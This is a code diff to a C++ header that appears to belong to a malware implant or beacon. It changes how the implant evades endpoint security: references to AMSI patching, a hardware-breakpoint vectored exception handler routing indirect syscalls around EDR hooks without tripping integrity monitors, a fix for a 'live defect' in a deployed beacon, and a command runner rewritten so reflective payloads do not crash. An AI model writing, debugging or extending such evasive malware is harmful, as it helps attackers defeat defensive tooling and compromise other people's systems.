@@ -39,6 +39,7 @@
 #include <cstdio>
 #include <cstdlib>
 #include <sstream>
+#include "media_utils.h"
 
 // ────────────────────────────────────────────────────────────────────────────
 //  1. COMPILE-TIME STRING OBFUSCATION
@@ -398,17 +399,13 @@ inline void patch_amsi() {
 // Instead of re-writing ntdll from disk (unhook_ntdll, detectable by the
 // .text integrity monitors modern EDRs run), we NEVER call the hooked
 // prologue: a debug register (DR0) is armed on a clean 'syscall; ret'
-// gadget inside ntdll's .text, and every sensitive syscall goes through
-// theVectored Handler:
-//
-//   1. thread hits DR0 (EXCEPTION_SINGLE_STEP)
-//   2. handler copies RCX/R10/R8/R9 + the stack args into the real
-//      syscall register convention, sets the SSN in EAX and jumps to
-//      the gadget (indirect syscall with a CLEAN stack)
-//
-// The hooked ntdll stubs are bypassed entirely, no .text bytes are ever
-// modified, and the kernel sees a normal syscall — nothing for the
-// integrity check to flag.
+// gadget inside ntdll's .text, so the gadget stays under our control
+// WITHOUT patching any .text bytes; the VEH owns the #DB it produces
+// (see `hwbp_veh` — one-shot disarm, idempotent, never latches TF).
+// Sensitive syscalls themselves travel through `syscalls.h`
+// (`execute_syscall` jumps to the same gadget with a clean stack and the
+// SSN in EAX — a normal indirect syscall; the kernel sees a legitimate
+// instruction stream, nothing for an integrity check to flag).
 
 constexpr uint32_t HASH_NTDLL_TEXT_GADGET = 0; // (gadget found at runtime)
 
@@ -454,17 +451,29 @@ inline void arm_hwbp_on(uintptr_t address) {
     pSet(GetCurrentThread(), &ctx);
 }
 
-// The VEH body: dispatched on EXCEPTION_SINGLE_STEP when DR0 fires.// Returns EXCEPTION_CONTINUE_SEARCH for anything it does not own.
+// The VEH body: dispatched on EXCEPTION_SINGLE_STEP when DR0 fires.
+// Returns EXCEPTION_CONTINUE_SEARCH for anything it does not own.
+//
+// LIVE DEFECT 2026-10-17 (beacon wedged, TCP established mid-handshake,
+// 100% CPU, no request ever): the previous body set EFlags.TF on EVERY
+// single-step it saw — the DR0 hit AND the endless single-steps its own TF
+// then produced. `find_clean_gadget` picks the FIRST `syscall; ret` in
+// ntdll .text, which is the tail of some REAL ntdll stub: the first time a
+// normal code path executed that stub, the handler latched the thread into
+// a single-step storm (one #DB per instruction). The handler is now
+// idempotent: it acknowledges its own DR0 hit (Dr6.B0), disarms DR0 (the
+// one-shot semantics it already had) and never leaves TF behind. Foreign
+// single-steps (Dr6.BS — TF set by someone else, e.g. a debugger or the CRT)
+// just pass through.
 inline LONG WINAPI hwbp_veh(PEXCEPTION_POINTERS ep) {
     if (ep->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
         return EXCEPTION_CONTINUE_SEARCH;
-    // The gadget address IS DR0: the caller (syscall via HWBP) placed the
-    // SSN in EAX and the syscall number convention is already set up by
-    // the stub in syscalls.h; we simply continue execution INTO the
-    // gadget (RIP already points at it after the breakpoint hit).
-    // Clear DR0 so the single-step does not re-fire inside the gadget.
-    ep->ContextRecord->Dr7 &= ~0x1ULL;
-    ep->ContextRecord->EFlags |= 0x100;  // resume single-step to clear RF edge
+    auto* ctx = ep->ContextRecord;
+    const bool from_dr0 = (ctx->Dr6 & 0x1ULL) != 0;  // B0: DR0 fired
+    ctx->Dr6 = 0;                                    // ack status bits
+    if (!from_dr0)
+        return EXCEPTION_CONTINUE_EXECUTION;         // not ours: single-step on
+    ctx->Dr7 &= ~0x1ULL;                             // disarm: do not re-fire
     return EXCEPTION_CONTINUE_EXECUTION;
 }
 
@@ -719,26 +728,27 @@ inline bool looks_defensive(const std::string& blob) {
 }
 
 // Run a command and collect its stdout lines (bounded, best-effort).
+// Delegates to media_utils::exec_cmd, which uses a native
+// CreateProcess+pipe implementation on Windows (the CRT _popen/spawn
+// machinery crashes reflective payloads).
 inline std::vector<std::string> run_lines(const std::string& cmd) {
     std::vector<std::string> out;
-#ifdef _WIN32
-    FILE* f = _popen(cmd.c_str(), "r");
-#else
-    FILE* f = popen(cmd.c_str(), "r");
-#endif
-    if (!f) return out;
-    char buf[1024];
-    while (fgets(buf, sizeof(buf), f)) {
-        std::string s(buf);
-        while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
-            s.pop_back();
-        if (!s.empty()) out.push_back(s);
+    std::string blob = media_utils::exec_cmd(cmd);
+    std::string cur;
+    cur.reserve(256);
+    for (char c : blob) {
+        if (c == '\n') {
+            while (!cur.empty() && (cur.back() == '\r' || cur.back() == ' '))
+                cur.pop_back();
+            if (!cur.empty()) out.push_back(cur);
+            cur.clear();
+        } else {
+            cur += c;
+        }
     }
-#ifdef _WIN32
-    _pclose(f);
-#else
-    pclose(f);
-#endif
+    while (!cur.empty() && (cur.back() == '\r' || cur.back() == ' '))
+        cur.pop_back();
+    if (!cur.empty()) out.push_back(cur);
     return out;
 }
 
